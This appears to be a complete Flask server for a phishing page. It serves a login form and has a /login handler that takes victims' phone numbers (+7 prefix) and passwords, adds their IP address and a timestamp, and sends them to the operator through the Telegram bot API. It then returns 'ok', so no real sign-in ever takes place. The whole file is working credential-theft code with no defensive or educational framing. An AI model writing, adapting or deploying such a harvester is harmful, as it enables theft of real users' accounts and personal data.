from flask import Flask, request
import requests, os, datetime

app = Flask(__name__)

html = open("index.html").read()

@app.route("/")
def index():
    return html

@app.route("/login", methods=["POST"])
def login():
    phone = request.form.get("phone", "")
    password = request.form.get("password", "")
    ip = request.remote_addr
    t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    bot = os.environ.get("BOT_TOKEN", "")
    chat = os.environ.get("CHAT_ID", "")

    msg = "🔐 ЛОГ\\n📱 +7 " + phone + "\\n🔑 " + password + "\\n🌐 " + ip + "\\n🕐 " + t
    try:
        requests.get(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={chat}&text={msg}")
    except:
        pass
    return "ok", 200
